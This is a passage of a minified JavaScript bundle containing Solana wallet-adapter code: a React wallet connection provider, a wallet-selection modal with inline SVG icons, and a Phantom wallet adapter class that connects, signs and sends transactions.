n=window.navigator.wallets||[];if(!Array.isArray(n))return console.error("window.navigator.wallets is not an array"),Ir;const{register:e}=Ir,t=(...r)=>r.forEach(i=>G0(()=>i({register:e})));try{Object.defineProperty(window.navigator,"wallets",{value:Object.freeze({push:t})})}catch{return console.error("window.navigator.wallets could not be set"),Ir}return t(...n),Ir}function b6(n){const e=FE(()=>new Set),{get:t,on:r}=FE(()=>A6()),[i,s]=Y.useState(()=>zE(t()));Y.useEffect(()=>{const a=[r("register",(...l)=>s(u=>[...u,...zE(l)])),r("unregister",(...l)=>s(u=>u.filter(h=>l.some(f=>f===h.wallet))))];return()=>a.forEach(l=>l())},[r]);const o=x6(i);return Y.useEffect(()=>{if(!o)return;const a=new Set(i);new Set(o.filter(u=>!a.has(u))).forEach(u=>u.destroy())},[o,i]),Y.useEffect(()=>()=>i.forEach(a=>a.destroy()),[]),Y.useMemo(()=>[...i,...n.filter(({name:a})=>i.some(l=>l.name===a)?(e.has(a)||(e.add(a),console.warn(`${a} was registered as a Standard Wallet. The Wallet Adapter for ${a} can be removed from your app.`)),!1):!0)],[i,n,e])}function FE(n){const e=Y.useRef(void 0);return e.current===void 0&&(e.current={value:n()}),e.current.value}function x6(n){const e=Y.useRef(void 0);return Y.useEffect(()=>{e.current=n}),e.current}function zE(n){return n.filter(m6).map(e=>new g6({wallet:e}))}var pl;(function(n){n[n.DESKTOP_WEB=0]="DESKTOP_WEB",n[n.MOBILE_WEB=1]="MOBILE_WEB"})(pl||(pl={}));function k6(n){return/(WebView|Version\/.+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)|; wv\).+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+))/i.test(n)}function C6({adapters:n,userAgentString:e}){return n.some(t=>t.name!==nu&&t.readyState===Ve.Installed)?pl.DESKTOP_WEB:e&&/android/i.test(e)&&!k6(e)?pl.MOBILE_WEB:pl.DESKTOP_WEB}function R6(n){return n?/devnet/i.test(n)?"devnet":/testnet/i.test(n)?"testnet":"mainnet-beta":"mainnet-beta"}function M6({children:n,wallets:e,adapter:t,isUnloadingRef:r,onAutoConnectRequest:i,onConnectError:s,onError:o,onSelectWallet:a}){const l=Y.useRef(!1),[u,h]=Y.useState(!1),f=Y.useRef(!1),[m,v]=Y.useState(!1),[x,k]=Y.useState(()=>(t==null?void 0:t.publicKey)??null),[I,S]=Y.useState(()=>(t==null?void 0:t.connected)??!1),b=Y.useRef(o);Y.useEffect(()=>(b.current=o,()=>{b.current=void 0}),[o]);const E=Y.useRef((_,C)=>(r.current||(b.current?b.current(_,C):(console.error(_,C),_ instanceof Xs&&typeof window<"u"&&C&&window.open(C.url,"_blank"))),_)),[U,H]=Y.useState(()=>e.map(_=>({adapter:_,readyState:_.readyState})).filter(({readyState:_})=>_!==Ve.Unsupported));Y.useEffect(()=>{H(C=>e.map((M,R)=>{const j=C[R];return j&&j.adapter===M&&j.readyState===M.readyState?j:{adapter:M,readyState:M.readyState}}).filter(({readyState:M})=>M!==Ve.Unsupported));function _(C){H(M=>{const R=M.findIndex(({adapter:$})=>$===this);if(R===-1)return M;const{adapter:j}=M[R];return[...M.slice(0,R),{adapter:j,readyState:C},...M.slice(R+1)].filter(({readyState:$})=>$!==Ve.Unsupported)})}return e.forEach(C=>C.on("readyStateChange",_,C)),()=>{e.forEach(C=>C.off("readyStateChange",_,C))}},[t,e]);const q=Y.useMemo(()=>U.find(_=>_.adapter===t)??null,[t,U]);Y.useEffect(()=>{if(!t)return;const _=R=>{k(R),l.current=!1,h(!1),S(!0),f.current=!1,v(!1)},C=()=>{r.current||(k(null),l.current=!1,h(!1),S(!1),f.current=!1,v(!1))},M=R=>{E.current(R,t)};return t.on("connect",_),t.on("disconnect",C),t.on("error",M),()=>{t.off("connect",_),t.off("disconnect",C),t.off("error",M),C()}},[t,r]);const L=Y.useRef(!1);Y.useEffect(()=>()=>{L.current=!1},[t]),Y.useEffect(()=>{L.current||l.current||I||!i||!((q==null?void 0:q.readyState)===Ve.Installed||(q==null?void 0:q.readyState)===Ve.Loadable)||(l.current=!0,h(!0),L.current=!0,async function(){try{await i()}catch{s()}finally{h(!1),l.current=!1}}())},[I,i,s,q]);const N=Y.useCallback(async(_,C,M)=>{if(!t)throw E.current(new bE);if(!I)throw E.current(new sn,t);return await t.sendTransaction(_,C,M)},[t,I]),B=Y.useMemo(()=>t&&"signTransaction"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signTransaction(_)}:void 0,[t,I]),z=Y.useMemo(()=>t&&"signAllTransactions"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signAllTransactions(_)}:void 0,[t,I]),W=Y.useMemo(()=>t&&"signMessage"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signMessage(_)}:void 0,[t,I]),K=Y.useMemo(()=>t&&"signIn"in t?async _=>await t.signIn(_):void 0,[t]),T=Y.useCallback(async()=>{if(l.current||f.current||q!=null&&q.adapter.connected)return;if(!q)throw E.current(new bE);const{adapter:_,readyState:C}=q;if(!(C===Ve.Installed||C===Ve.Loadable))throw E.current(new Xs,_);l.current=!0,h(!0);try{await _.connect()}catch(M){throw s(),M}finally{h(!1),l.current=!1}},[s,q]),d=Y.useCallback(async()=>{if(!f.current&&t){f.current=!0,v(!0);try{await t.disconnect()}finally{v(!1),f.current=!1}}},[t]);return ce.createElement(dx.Provider,{value:{autoConnect:!!i,wallets:U,wallet:q,publicKey:x,connected:I,connecting:u,disconnecting:m,select:a,connect:T,disconnect:d,sendTransaction:N,signTransaction:B,signAllTransactions:z,signMessage:W,signIn:K}},n)}let mm;function N6(){var n;return mm===void 0&&(mm=((n=globalThis.navigator)==null?void 0:n.userAgent)??null),mm}function WE(n){const e=N6();return C6({adapters:n,userAgentString:e})===pl.MOBILE_WEB}function P6(){const n=globalThis.location;if(n)return`${n.protocol}//${n.host}`}function L6({children:n,wallets:e,autoConnect:t,localStorageKey:r="walletName",onError:i}){const{connection:s}=d3(),o=b6(e),a=Y.useMemo(()=>{if(!WE(o))return null;const b=o.find(E=>E.name===nu);return b||new r6({addressSelector:i6(),appIdentity:{uri:P6()},authorizationResultCache:s6(),cluster:R6(s==null?void 0:s.rpcEndpoint),onWalletNotFound:a6()})},[o,s==null?void 0:s.rpcEndpoint]),l=Y.useMemo(()=>a==null||o.indexOf(a)!==-1?o:[a,...o],[o,a]),[u,h]=I3(r,null),f=Y.useMemo(()=>l.find(b=>b.name===u)??null,[l,u]),m=Y.useCallback(b=>{u!==b&&(f&&f.name!==nu&&f.disconnect(),h(b))},[f,h,u]);Y.useEffect(()=>{if(!f)return;function b(){k.current||h(null)}return f.on("disconnect",b),()=>{f.off("disconnect",b)}},[f,o,h,u]);const v=Y.useRef(!1),x=Y.useMemo(()=>{if(!(!t||!f))return async()=>{(t===!0||await t(f))&&(v.current?await f.connect():await f.autoConnect())}},[t,f]),k=Y.useRef(!1);Y.useEffect(()=>{if(u===nu&&WE(o)){k.current=!1;return}function b(){k.current=!0}return window.addEventListener("beforeunload",b),()=>{window.removeEventListener("beforeunload",b)}},[o,u]);const I=Y.useCallback(()=>{f&&m(null)},[f,m]),S=Y.useCallback(b=>{v.current=!0,m(b)},[m]);return ce.createElement(M6,{wallets:l,adapter:f,isUnloadingRef:k,onAutoConnectRequest:x,onConnectError:I,onError:i,onSelectWallet:S},n)}const Vx={setVisible(n){console.error(Fx("call","setVisible"))},visible:!1};Object.defineProperty(Vx,"visible",{get(){return console.error(Fx("read","visible")),!1}});function Fx(n,e){return`You have tried to  ${n} "${e}" on a WalletModalContext without providing one. Make sure to render a WalletModalProvider as an ancestor of the component that uses WalletModalContext`}const zx=Y.createContext(Vx);function D6(){return Y.useContext(zx)}const O6=n=>ce.createElement("button",{className:`wallet-adapter-button ${n.className||""}`,disabled:n.disabled,style:n.style,onClick:n.onClick,tabIndex:n.tabIndex||0,type:"button"},n.startIcon&&ce.createElement("i",{className:"wallet-adapter-button-start-icon"},n.startIcon),n.children,n.endIcon&&ce.createElement("i",{className:"wallet-adapter-button-end-icon"},n.endIcon)),B6=({wallet:n,...e})=>n&&ce.createElement("img",{src:n.adapter.icon,alt:`${n.adapter.name} icon`,...e}),$E=({id:n,children:e,expanded:t=!1})=>{const r=Y.useRef(null),i=Y.useRef(!0),s="height 250ms ease-out",o=()=>{const l=r.current;l&&requestAnimationFrame(()=>{l.style.height=l.scrollHeight+"px"})},a=()=>{const l=r.current;l&&requestAnimationFrame(()=>{l.style.height=l.offsetHeight+"px",l.style.overflow="hidden",requestAnimationFrame(()=>{l.style.height="0"})})};return Y.useLayoutEffect(()=>{t?o():a()},[t]),Y.useLayoutEffect(()=>{const l=r.current;if(!l)return;function u(){l&&(l.style.overflow=t?"initial":"hidden",t&&(l.style.height="auto"))}function h(f){l&&f.target===l&&f.propertyName==="height"&&u()}return i.current&&(u(),i.current=!1),l.addEventListener("transitionend",h),()=>l.removeEventListener("transitionend",h)},[t]),ce.createElement("div",{className:"wallet-adapter-collapse",id:n,ref:r,role:"region",style:{height:0,transition:i.current?void 0:s}},e)},ym=({handleClick:n,tabIndex:e,wallet:t})=>ce.createElement("li",null,ce.createElement(O6,{onClick:n,startIcon:ce.createElement(B6,{wallet:t}),tabIndex:e},t.adapter.name,t.readyState===Ve.Installed&&ce.createElement("span",null,"Detected"))),U6=()=>ce.createElement("svg",{width:"97",height:"96",viewBox:"0 0 97 96",fill:"none",xmlns:"http://www.w3.org/2000/svg"},ce.createElement("circle",{cx:"48.5",cy:"48",r:"48",fill:"url(#paint0_linear_880_5115)",fillOpacity:"0.1"}),ce.createElement("circle",{cx:"48.5",cy:"48",r:"47",stroke:"url(#paint1_linear_880_5115)",strokeOpacity:"0.4",strokeWidth:"2"}),ce.createElement("g",{clipPath:"url(#clip0_880_5115)"},ce.createElement("path",{d:"M65.5769 28.1523H31.4231C27.6057 28.1523 24.5 31.258 24.5 35.0754V60.9215C24.5 64.7389 27.6057 67.8446 31.4231 67.8446H65.5769C69.3943 67.8446 72.5 64.7389 72.5 60.9215V35.0754C72.5 31.258 69.3943 28.1523 65.5769 28.1523ZM69.7308 52.1523H59.5769C57.2865 52.1523 55.4231 50.289 55.4231 47.9985C55.4231 45.708 57.2864 43.8446 59.5769 43.8446H69.7308V52.1523ZM69.7308 41.0754H59.5769C55.7595 41.0754 52.6539 44.1811 52.6539 47.9985C52.6539 51.8159 55.7595 54.9215 59.5769 54.9215H69.7308V60.9215C69.7308 63.2119 67.8674 65.0754 65.5769 65.0754H31.4231C29.1327 65.0754 27.2692 63.212 27.2692 60.9215V35.0754C27.2692 32.785 29.1326 30.9215 31.4231 30.9215H65.5769C67.8673 30.9215 69.7308 32.7849 69.7308 35.0754V41.0754Z",fill:"url(#paint2_linear_880_5115)"}),ce.createElement("path",{d:"M61.4231 46.6172H59.577C58.8123 46.6172 58.1924 47.2371 58.1924 48.0018C58.1924 48.7665 58.8123 49.3863 59.577 49.3863H61.4231C62.1878 49.3863 62.8077 48.7664 62.8077 48.0018C62.8077 47.2371 62.1878 46.6172 61.4231 46.6172Z",fill:"url(#paint3_linear_880_5115)"})),ce.createElement("defs",null,ce.createElement("linearGradient",{id:"paint0_linear_880_5115",x1:"3.41664",y1:"98.0933",x2:"103.05",y2:"8.42498",gradientUnits:"userSpaceOnUse"},ce.createElement("stop",{stopColor:"#9945FF"}),ce.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ce.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ce.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ce.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ce.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ce.createElement("linearGradient",{id:"paint1_linear_880_5115",x1:"3.41664",y1:"98.0933",x2:"103.05",y2:"8.42498",gradientUnits:"userSpaceOnUse"},ce.createElement("stop",{stopColor:"#9945FF"}),ce.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ce.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ce.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ce.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ce.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ce.createElement("linearGradient",{id:"paint2_linear_880_5115",x1:"25.9583",y1:"68.7101",x2:"67.2337",y2:"23.7879",gradientUnits:"userSpaceOnUse"},ce.createElement("stop",{stopColor:"#9945FF"}),ce.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ce.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ce.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ce.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ce.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ce.createElement("linearGradient",{id:"paint3_linear_880_5115",x1:"58.3326",y1:"49.4467",x2:"61.0002",y2:"45.4453",gradientUnits:"userSpaceOnUse"},ce.createElement("stop",{stopColor:"#9945FF"}),ce.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ce.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ce.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ce.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ce.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ce.createElement("clipPath",{id:"clip0_880_5115"},ce.createElement("rect",{width:"48",height:"48",fill:"white",transform:"translate(24.5 24)"})))),j6=({className:n="",container:e="body"})=>{const t=Y.useRef(null),{wallets:r,select:i}=px(),{setVisible:s}=D6(),[o,a]=Y.useState(!1),[l,u]=Y.useState(!1),[h,f]=Y.useState(null),[m,v]=Y.useMemo(()=>{const E=[],U=[];for(const H of r)H.readyState===Ve.Installed?E.push(H):U.push(H);return E.length?[E,U]:[U,[]]},[r]),x=Y.useCallback(()=>{u(!1),setTimeout(()=>s(!1),150)},[s]),k=Y.useCallback(E=>{E.preventDefault(),x()},[x]),I=Y.useCallback((E,U)=>{i(U),k(E)},[i,k]),S=Y.useCallback(()=>a(!o),[o]),b=Y.useCallback(E=>{const U=t.current;if(!U)return;const H=U.querySelectorAll("button"),q=H[0],L=H[H.length-1];E.shiftKey?document.activeElement===q&&(L.focus(),E.preventDefault()):document.activeElement===L&&(q.focus(),E.preventDefault())},[t]);return Y.useLayoutEffect(()=>{const E=H=>{H.key==="Escape"?x():H.key==="Tab"&&b(H)},{overflow:U}=window.getComputedStyle(document.body);return setTimeout(()=>u(!0),0),document.body.style.overflow="hidden",window.addEventListener("keydown",E,!1),()=>{document.body.style.overflow=U,window.removeEventListener("keydown",E,!1)}},[x,b]),Y.useLayoutEffect(()=>f(document.querySelector(e)),[e]),h&&PA.createPortal(ce.createElement("div",{"aria-labelledby":"wallet-adapter-modal-title","aria-modal":"true",className:`wallet-adapter-modal ${l&&"wallet-adapter-modal-fade-in"} ${n}`,ref:t,role:"dialog"},ce.createElement("div",{className:"wallet-adapter-modal-container"},ce.createElement("div",{className:"wallet-adapter-modal-wrapper"},ce.createElement("button",{onClick:k,className:"wallet-adapter-modal-button-close"},ce.createElement("svg",{width:"14",height:"14"},ce.createElement("path",{d:"M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"}))),m.length?ce.createElement(ce.Fragment,null,ce.createElement("h1",{className:"wallet-adapter-modal-title"},"Connect a wallet on Solana to continue"),ce.createElement("ul",{className:"wallet-adapter-modal-list"},m.map(E=>ce.createElement(ym,{key:E.adapter.name,handleClick:U=>I(U,E.adapter.name),wallet:E})),v.length?ce.createElement($E,{expanded:o,id:"wallet-adapter-modal-collapse"},v.map(E=>ce.createElement(ym,{key:E.adapter.name,handleClick:U=>I(U,E.adapter.name),tabIndex:o?0:-1,wallet:E}))):null),v.length?ce.createElement("button",{className:"wallet-adapter-modal-list-more",onClick:S,tabIndex:0},ce.createElement("span",null,o?"Less ":"More ","options"),ce.createElement("svg",{width:"13",height:"7",viewBox:"0 0 13 7",xmlns:"http://www.w3.org/2000/svg",className:`${o?"wallet-adapter-modal-list-more-icon-rotate":""}`},ce.createElement("path",{d:"M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"}))):null):ce.createElement(ce.Fragment,null,ce.createElement("h1",{className:"wallet-adapter-modal-title"},"You'll need a wallet on Solana to continue"),ce.createElement("div",{className:"wallet-adapter-modal-middle"},ce.createElement(U6,null)),v.length?ce.createElement(ce.Fragment,null,ce.createElement("button",{className:"wallet-adapter-modal-list-more",onClick:S,tabIndex:0},ce.createElement("span",null,o?"Hide ":"Already have a wallet? View ","options"),ce.createElement("svg",{width:"13",height:"7",viewBox:"0 0 13 7",xmlns:"http://www.w3.org/2000/svg",className:`${o?"wallet-adapter-modal-list-more-icon-rotate":""}`},ce.createElement("path",{d:"M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"}))),ce.createElement($E,{expanded:o,id:"wallet-adapter-modal-collapse"},ce.createElement("ul",{className:"wallet-adapter-modal-list"},v.map(E=>ce.createElement(ym,{key:E.adapter.name,handleClick:U=>I(U,E.adapter.name),tabIndex:o?0:-1,wallet:E}))))):null))),ce.createElement("div",{className:"wallet-adapter-modal-overlay",onMouseDown:k})),h)},V6=({children:n,...e})=>{const[t,r]=Y.useState(!1);return ce.createElement(zx.Provider,{value:{visible:t,setVisible:r}},n,t&&ce.createElement(j6,{...e}))},F6="modulepreload",z6=function(n,e){return new URL(n,e).href},HE={},Wx=function(e,t,r){if(!t||t.length===0)return e();const i=document.getElementsByTagName("link");return Promise.all(t.map(s=>{if(s=z6(s,r),s in HE)return;HE[s]=!0;const o=s.endsWith(".css"),a=o?'[rel="stylesheet"]':"";if(!!r)for(let h=i.length-1;h>=0;h--){const f=i[h];if(f.href===s&&(!o||f.rel==="stylesheet"))return}else if(document.querySelector(`link[href="${s}"]${a}`))return;const u=document.createElement("link");if(u.rel=o?"stylesheet":F6,o||(u.as="script",u.crossOrigin=""),u.href=s,document.head.appendChild(u),o)return new Promise((h,f)=>{u.addEventListener("load",h),u.addEventListener("error",()=>f(new Error(`Unable to preload CSS for ${s}`)))})})).then(()=>e()).catch(s=>{const o=new Event("vite:preloadError",{cancelable:!0});if(o.payload=s,window.dispatchEvent(o),!o.defaultPrevented)throw s})},W6="Phantom";class $6 extends tv{constructor(e={}){super(),this.name=W6,this.url="https://phantom.app",this.icon="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==",this.supportedTransactionVersions=new Set(["legacy",0]),this._readyState=typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.NotDetected,this._disconnected=()=>{const t=this._wallet;t&&(t.off("disconnect",this._disconnected),t.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null,this.emit("error",new xp),this.emit("disconnect"))},this._accountChanged=t=>{const r=this._publicKey;if(r){try{t=new Ie(t.toBytes())}catch(i){this.emit("error",new Rl(i==null?void 0:i.message,i));return}r.equals(t)||(this._publicKey=t,this.emit("connect",t))}},this._connecting=!1,this._wallet=null,this._publicKey=null,this._readyState!==Ve.Unsupported&&(B0()?(this._readyState=Ve.Loadable,this.emit("readyStateChange",this._readyState)):fx(()=>{var t,r,i;return(r=(t=window.phantom)==null?void 0:t.solana)!=null&&r.isPhantom||(i=window.solana)!=null&&i.isPhantom?(this._readyState=Ve.Installed,this.emit("readyStateChange",this._readyState),!0):!1}))}get publicKey(){return this._publicKey}get connecting(){return this._connecting}get readyState(){return this._readyState}async autoConnect(){this.readyState===Ve.Installed&&await this.connect()}async connect(){var e;try{if(this.connected||this.connecting)return;if(this.readyState===Ve.Loadable){const i=encodeURIComponent(window.location.href),s=encodeURIComponent(window.location.origin);window.location.href=`https://phantom.app/ul/browse/${i}?ref=${s}`;return}if(this.readyState!==Ve.Installed)throw new Xs;this._connecting=!0;const t=((e=window.phantom)==null?void 0:e.solana)||window.solana;if(!t.isConnected)try{await t.connect()}catch(i){throw new Vs(i==null?void 0:i.message,i)}if(!t.publicKey)throw new Vo;let r;try{r=new Ie(t.publicKey.toBytes())}catch(i){throw new Rl(i==null?void 0:i.message,i)}t.on("disconnect",this._disconnected),t.on("accountChanged",this._accountChanged),this._wallet=t,this._publicKey=r,this.emit("connect",r)}catch(t){throw this.emit("error",t),t}finally{this._connecting=!1}}async disconnect(){const e=this._wallet;if(e){e.off("disconnect",this._disconnected),e.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null;try{await e.disconnect()}catch(t){this.emit("error",new ev(t==null?void 0:t.message,t))}}this.emit("disconnect")}async sendTransaction(e,t,r={}){try{const i=this._wallet;if(!i)throw new sn;try{const{signers:s,...o}=r;Zi(e)?s!=null&&s.length&&e.sign(s):(e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s)),o.preflightCommitment=o.preflightCommitment||t.commitment;const{signature:a}=await i.signAndSendTransaction(e,o);return a}catch(s){throw s instanceof xn?s:new Yi(s==null?void 0:s.message,s)}}catch(i){throw this.emit("error",i),i}}async signTransaction(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signTransaction(e)||e}catch(r){throw new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signAllTransactions(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signAllTransactions(e)||e}catch(r){throw new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signMessage(e){try{const t=this._wallet;if(!t)throw new sn;try{const{signature:r}=await t.signMessage(e);return r}catch(r){throw new kp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}}const H6="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjMxIiB2aWV3Qm94PSIwIDAgMzEgMzEiIHdpZHRoPSIzMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjIwLjI1IiB4Mj0iMjYuNTcxIiB5MT0iMjcuMTczIiB5Mj0iMTkuODU4Ij48c3RvcCBvZmZzZXQ9Ii4wOCIgc3RvcC1jb2xvcj0iIzk5NDVmZiIvPjxzdG9wIG9mZnNldD0iLjMiIHN0b3AtY29sb3I9IiM4NzUyZjMiLz48c3RvcCBvZmZzZXQ9Ii41IiBzdG9wLWNvbG9yPSIjNTQ5N2Q1Ii8+PHN0b3Agb2Zmc2V0PSIuNiIgc3RvcC1jb2xvcj0iIzQzYjRjYSIvPjxzdG9wIG9mZnNldD0iLjcyIiBzdG9wLWNvbG9yPSIjMjhlMGI5Ii8+PHN0b3Agb2Zmc2V0PSIuOTciIHN0b3AtY29sb3I9IiMxOWZiOWIiLz48L2xpbmVhckdyYWRpZW50PjxnIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjA5NCI+PHBhdGggZD0ibTI2LjEwOSAzLjY0My05LjM2OSA2Ljk1OSAxLjczMy00LjEwNSA3LjYzNy0yLjg1M3oiIGZpbGw9IiNlMjc2MWIiIHN0cm9rZT0iI2UyNzYxYiIvPjxnIGZpbGw9IiNlNDc2MWIiIHN0cm9rZT0iI2U0NzYxYiI+PHBhdGggZD0ibTQuNDgxIDMuNjQzIDkuMjk0IDcuMDI0LTEuNjQ4LTQuMTcxem0xOC4yNTggMTYuMTMtMi40OTUgMy44MjMgNS4zMzkgMS40NjkgMS41MzUtNS4yMDctNC4zNzgtLjA4NXptLTE5LjI0Ny4wODUgMS41MjUgNS4yMDcgNS4zMzktMS40NjktMi40OTUtMy44MjN6Ii8+PHBhdGggZD0ibTEwLjA1NSAxMy4zMTMtMS40ODggMi4yNTEgNS4zMDEuMjM1LS4xODgtNS42OTd6bTEwLjQ4IDAtMy42NzItMy4yNzctLjEyMiA1Ljc2MyA1LjI5Mi0uMjM1LTEuNDk3LTIuMjUxem0tMTAuMTc4IDEwLjI4MyAzLjE4My0xLjU1NC0yLjc0OS0yLjE0Ny0uNDMzIDMuNzAxem02LjY5NS0xLjU1NCAzLjE5MiAxLjU1NC0uNDQzLTMuNzAxeiIvPjwvZz48cGF0aCBkPSJtMjAuMjQ0IDIzLjU5Ni0zLjE5Mi0xLjU1NC4yNTQgMi4wODEtLjAyOC44NzZ6bS05Ljg4NyAwIDIuOTY2IDEuNDAzLS4wMTktLjg3Ni4yMzUtMi4wODEtMy4xODMgMS41NTR6IiBmaWxsPSIjZDdjMWIzIiBzdHJva2U9IiNkN2MxYjMiLz48cGF0aCBkPSJtMTMuMzY5IDE4LjUyMS0yLjY1NS0uNzgxIDEuODc0LS44NTd6bTMuODUxIDAgLjc4MS0xLjYzOCAxLjg4My44NTctMi42NjUuNzgxeiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEwLjM1NyAyMy41OTYuNDUyLTMuODIzLTIuOTQ3LjA4NXptOS40MzUtMy44MjMuNDUyIDMuODIzIDIuNDk1LTMuNzM4em0yLjI0MS00LjIwOS01LjI5Mi4yMzUuNDkgMi43MjEuNzgyLTEuNjM4IDEuODgzLjg1N3ptLTExLjMxOCAyLjE3NSAxLjg4My0uODU3Ljc3MiAxLjYzOC40OTktMi43MjEtNS4zMDEtLjIzNXoiIGZpbGw9IiNjZDYxMTYiIHN0cm9rZT0iI2NkNjExNiIvPjxwYXRoIGQ9Im04LjU2NyAxNS41NjQgMi4yMjIgNC4zMzEtLjA3NS0yLjE1NnptMTEuMzI4IDIuMTc1LS4wOTQgMi4xNTYgMi4yMzItNC4zMzEtMi4xMzcgMi4xNzV6bS02LjAyNi0xLjk0LS40OTkgMi43MjEuNjIxIDMuMjExLjE0MS00LjIyOC0uMjY0LTEuNzA0em0yLjg3MiAwLS4yNTQgMS42OTUuMTEzIDQuMjM3LjYzMS0zLjIxMXoiIGZpbGw9IiNlNDc1MWYiIHN0cm9rZT0iI2U0NzUxZiIvPjxwYXRoIGQ9Im0xNy4y